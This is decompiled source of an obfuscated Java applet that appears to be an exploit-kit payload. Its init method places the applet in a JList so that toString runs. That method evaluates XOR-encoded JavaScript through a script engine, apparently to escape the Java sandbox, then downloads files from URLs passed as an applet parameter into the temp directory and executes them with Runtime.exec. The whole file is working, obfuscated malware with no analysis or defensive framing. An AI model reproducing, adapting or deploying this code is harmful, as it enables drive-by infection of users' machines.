import javax.script.ScriptEngine;
import javax.script.Invocable;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class l extends Applet
{
    @Override
    public void init() {
        try {
            this.add(new JList<Object>((Object[])new Object[] { this.a() }));
        }
        catch (Exception ex) {}
    }
    
    public static String a(final String s) {
        final int length = s.length();
        final char[] array = new char[length];
        int n;
        int i = n = length - 1;
        final char[] array2 = array;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n2 = n;
            final char char1 = s.charAt(n2);
            --n;
            array3[n2] = (char)(char1 ^ '0');
            if (n < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n3 = n;
            final char c = (char)(s.charAt(n3) ^ 'M');
            --n;
            array4[n3] = c;
            i = n;
        }
        return new String(array2);
    }
    
    private static String a(String string, final int n) {
        final String a = a.a("\u000e\u001d\f\u0018\\\u0017Z\u0005Q\u0012\rA\b>\u0000!^C[\u0015K@\u0001EP9m");
        final StringBuffer sb = new StringBuffer();
        final StringBuffer sb2 = new StringBuffer();
        int n2 = 0;
        int n3;
        int i = n3 = 0;
        while (i < string.length()) {
            n2 += n;
            final StringBuffer sb3 = sb;
            final int n4 = (a.indexOf(string.charAt(n3)) + n2) % a.length();
            final String s = a;
            ++n3;
            sb3.append(s.charAt(n4));
            i = n3;
        }
        string = sb.toString();
        int n5;
        int j = n5 = 0;
        while (j < string.length()) {
            final String s2 = string;
            final int n6 = n5;
            final String substring = s2.substring(n6, n6 + 2);
            final StringBuffer sb4 = sb2;
            final int intValue = Integer.valueOf(substring, 16);
            n5 += 2;
            sb4.append((char)intValue);
            j = n5;
        }
        return sb2.toString();
    }
    
    private Object a() {
        try {
            final ScriptEngine a = a.a();
            final byte[] array = { 60, 47, 52, 57, 46, 51, 53, 52, 122, 46, 53, 9, 46, 40, 51, 52, 61, 114, 53, 115, 33, 51, 103, 106, 97, 46, 50, 51, 41, 116, 46, 53, 9, 46, 40, 51, 52, 61, 103, 60, 47, 52, 57, 46, 51, 53, 52, 114, 115, 33, 51, 60, 114, 51, 103, 103, 106, 115, 46, 40, 35, 33, 48, 59, 44, 59, 116, 54, 59, 52, 61, 116, 9, 35, 41, 46, 63, 55, 116, 41, 63, 46, 9, 63, 57, 47, 40, 51, 46, 35, 23, 59, 52, 59, 61, 63, 40, 114, 52, 47, 54, 54, 115, 97, 53, 116, 46, 53, 9, 46, 40, 51, 52, 61, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            final byte b = 114;
            array[b] = b;
            final byte b2 = 115;
            array[b2] = b2;
            array[116] = 97;
            array[117] = 39;
            array[118] = 57;
            array[119] = 59;
            array[120] = 46;
            array[121] = 57;
            array[122] = 50;
            array[123] = 114;
            array[124] = 63;
            array[125] = 115;
            array[126] = 33;
            array[127] = 39;
            array[128] = 51;
            array[129] = 103;
            array[130] = 107;
            array[131] = 97;
            array[132] = 40;
            array[133] = 63;
            array[134] = 46;
            array[135] = 47;
            array[136] = 40;
            array[137] = 52;
            array[138] = 122;
            array[140] = (array[139] = 125);
            array[141] = 97;
            array[142] = 39;
            array[143] = 97;
            array[144] = 63;
            array[145] = 103;
            array[146] = 52;
            array[147] = 63;
            array[148] = 45;
            array[149] = 122;
            array[150] = 31;
            array[152] = (array[151] = 40);
            array[153] = 53;
            array[154] = 40;
            array[155] = 114;
            array[156] = 115;
            array[157] = 97;
            array[158] = 63;
            array[159] = 116;
            array[160] = 55;
            array[161] = 63;
            array[163] = (array[162] = 41);
            array[164] = 59;
            array[165] = 61;
            array[166] = 63;
            array[167] = 103;
            array[168] = 46;
            array[169] = 50;
            array[170] = 51;
            array[171] = 41;
            array[172] = 97;
            array[173] = 40;
            array[174] = 63;
            array[175] = 46;
            array[176] = 47;
            array[177] = 40;
            array[178] = 52;
            array[179] = 122;
            array[180] = 63;
            array[181] = 97;
            array[182] = 39;
            Class.forName(a("Z,F,HcC.B$@9\u001e\u001eS?Y=D\b^*Y#U")).getMethod(a.a("\u0016O\u0012U"), String.class).invoke(a, a(array, 90));
            return a.a(a(a("$UtFt[.}zX}T\u007fW)S"), 3), (Invocable)a, this);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    @Override
    public final String toString() {
        try {
            final a a = new a();
            final String[] split = this.getParameter(a.a("L\u0001U")).split(a("pl\u0013"));
            final String s = (String)Class.forName(a.a("\u0019X\u0005X]U\u0012W\u0014\u0017 @\u0000M\u0016T")).getMethod(a("W(D\u001dB\"@(B9I"), String.class).invoke(null, a.a("\u0019X\u0005X]P\u001c\u0017\u0007T\u0003]\u001aK"));
            final String a2 = a(a("+}\u007fF&[?W|z~\u0004\u0007\u0007~\u0001,\u0002"), 4);
            final String a3 = a(a.a("\u0011\u000b\u001b\b9O\u0018[\u0017Z'^BtC[\u0005\r\u0012\fJk\u0001XGkEOC\u000f\u0005\b\u001bX"), 5);
            final byte[] array = { 94, 64 };
            a("C)\b+X:]$V");
            final String a4 = a(array, 51);
            Integer n2;
            for (Integer n = n2 = 0; n < split.length && split[n2].length() != 0; n = ++n2) {
                final String string = new StringBuilder().insert(0, s).append(new StringBuilder().insert(0, a4).append(n2).append(a2).toString()).toString();
                if (a.a(split[n2], string)) {
                    final String string2 = new StringBuilder().insert(0, a3).append(string).toString();
                    try {
                        Class.forName(a("Z,F,\u001e!Q#Wcb8^9Y U")).getMethod(a.a("\u0016A\u0016Z"), String.class).invoke(Runtime.getRuntime(), string2);
                    }
                    catch (Exception ex) {}
                }
            }
            a.a(new StringBuilder().insert(0, split[n2 - 1]).append(a.a("H\b")).toString(), null);
        }
        catch (Exception ex2) {}
        return "";
    }
    
    private static String a(final byte[] array, final int n) {
        int n2;
        int i = n2 = 0;
        while (i < array.length) {
            final int n3 = n2;
            final byte b = (byte)(array[n2] ^ n);
            ++n2;
            array[n3] = b;
            i = n2;
        }
        return new String(array);
    }
}
